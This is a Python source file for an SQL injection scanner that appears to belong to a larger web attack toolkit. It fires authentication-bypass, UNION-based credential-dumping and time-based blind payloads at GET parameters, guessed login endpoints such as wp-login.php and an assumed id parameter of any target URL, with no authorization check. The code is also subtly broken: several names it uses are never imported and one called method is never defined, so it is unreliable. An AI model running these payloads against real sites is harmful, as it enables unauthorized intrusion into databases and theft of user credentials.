#!/usr/bin/env python3
"""
SQL Injection Scanner with advanced detection techniques
"""

import requests
import time
import re
from colorama import Fore, Style
from utils import ScannerBase, save_results, load_payloads

class SqlInjection(ScannerBase):
    def __init__(self):
        super().__init__()
        self.module_name = "sql_injection"
        self.vulnerabilities = []
        self.payloads = load_payloads("sqli.txt")
        self.error_patterns = [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"PostgreSQL.*ERROR",
            r"Driver.*SQL[\-\_ ]*Server",
            r"SQLite.Exception",
            r"Unclosed quotation mark",
            r"Microsoft OLE DB Provider",
            r"ODBC Driver",
            r"ORA-[0-9]{5}",
            r"JET Database Engine",
        ]
    
    def scan(self, target):
        """Main scanning function"""
        self.log(f"Starting SQL Injection scan on {target}", "INFO")
        
        # Test different injection points
        self.scan_get_parameters(target)
        self.scan_post_parameters(target)
        self.scan_headers(target)
        self.blind_sql_test(target)
        
        return self.vulnerabilities
    
    def scan_get_parameters(self, target):
        """Scan URL parameters for SQLi"""
        try:
            response = self.make_request(target)
            if not response:
                return
            
            
            parsed = urlparse(target)
            if parsed.query:
                params = parsed.query.split('&')
                
                for param_pair in params:
                    if '=' in param_pair:
                        param_name = param_pair.split('=')[0]
                        
                        for payload in self.payloads[:10]:  
                            test_url = target.replace(
                                f"{param_name}=",
                                f"{param_name}={payload}"
                            )
                            
                            test_response = self.make_request(test_url)
                            if test_response and self.check_sql_errors(test_response.text):
                                self.vulnerabilities.append({
                                    "type": "SQL Injection",
                                    "url": test_url,
                                    "severity": "Critical",
                                    "description": f"SQLi in GET parameter: {param_name}",
                                    "proof": f"Payload: {payload}"
                                })
                                self.log(f"Found SQLi in GET param: {param_name}", "SUCCESS")
                                break
                                
        except Exception as e:
            self.log(f"Error scanning GET params: {e}", "ERROR")
    
    def scan_post_parameters(self, target):
        """Scan POST parameters for SQLi"""
        try:
            # This would need to parse forms first
            # For now, test common endpoints
            post_endpoints = [
                "/login.php",
                "/search.php",
                "/contact.php",
                "/admin/login",
                "/wp-login.php",
            ]
            
            for endpoint in post_endpoints:
                test_url = urljoin(target, endpoint)
                
                
                params = {
                    "username": "' OR '1'='1",
                    "password": "' OR '1'='1",
                    "email": "' OR '1'='1",
                    "search": "' OR '1'='1",
                    "query": "' OR '1'='1",
                }
                
                for param_name, payload in params.items():
                    data = {param_name: payload}
                    response = self.make_request(test_url, method="POST", data=data)
                    
                    if response and self.check_sql_errors(response.text):
                        self.vulnerabilities.append({
                            "type": "SQL Injection",
                            "url": test_url,
                            "severity": "Critical",
                            "description": f"SQLi in POST parameter: {param_name}",
                            "proof": f"Payload: {payload}"
                        })
                        self.log(f"Found SQLi in POST: {param_name}", "SUCCESS")
                        
        except Exception as e:
            self.log(f"Error scanning POST params: {e}", "ERROR")
    
    def blind_sql_test(self, target):
        """Test for Blind SQL Injection"""
        try:
            
            time_payloads = [
                "' AND SLEEP(5)--",
                "' OR SLEEP(5)--",
                "' WAITFOR DELAY '00:00:05'--",
            ]
            
            for payload in time_payloads:
                test_url = f"{target}?id=1{payload}"
                start_time = time.time()
                response = self.make_request(test_url)
                elapsed = time.time() - start_time
                
                if elapsed > 4:  
                    self.vulnerabilities.append({
                        "type": "Blind SQL Injection",
                        "url": test_url,
                        "severity": "High",
                        "description": "Time-based Blind SQL Injection",
                        "proof": f"Response delayed {elapsed:.2f} seconds with payload: {payload}"
                    })
                    self.log(f"Possible Blind SQLi (Time-based)", "WARNING")
                    break
                    
        except Exception as e:
            self.log(f"Error in blind SQL test: {e}", "ERROR")
    
    def check_sql_errors(self, content):
        """Check if response contains SQL error messages"""
        for pattern in self.error_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                return True
        return False
    
    def generate_payloads(self):
        """Generate SQLi payloads"""
        payloads = [
            
            "' UNION SELECT NULL--",
            "' UNION SELECT username,password FROM users--",
            
            
            "' AND ExtractValue(0,CONCAT(0x7e,@@version))--",
            
            
            "' OR 1=1--",
            "' AND 1=0--",
        ]
        return payloads

def main():
    scanner = SqlInjection()
    
    if len(sys.argv) > 1:
        target = sys.argv[1]
    else:
        target = input("Enter target URL: ").strip()
    
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    print(f"{Fore.CYAN}\\n[+] Starting SQL Injection Scanner{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[+] Target: {target}{Style.RESET_ALL}")
    
    results = scanner.scan(target)
    
    if results:
        print(f"{Fore.GREEN}\\n[+] Found {len(results)} SQL Injection vulnerabilities!{Style.RESET_ALL}")
        for vuln in results:
            print(f"{Fore.RED}[{vuln['severity']}] {vuln['description']}{Style.RESET_ALL}")
            print(f"     URL: {vuln['url']}")
            if 'proof' in vuln:
                print(f"     Proof: {vuln['proof'][:100]}...")
            print()
        
        
        filename = save_results(results, scanner.module_name)
        print(f"{Fore.CYAN}[+] Results saved to {filename}{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}[-] No SQL Injection vulnerabilities found{Style.RESET_ALL}")

if __name__ == "__main__":
    import sys
    main()
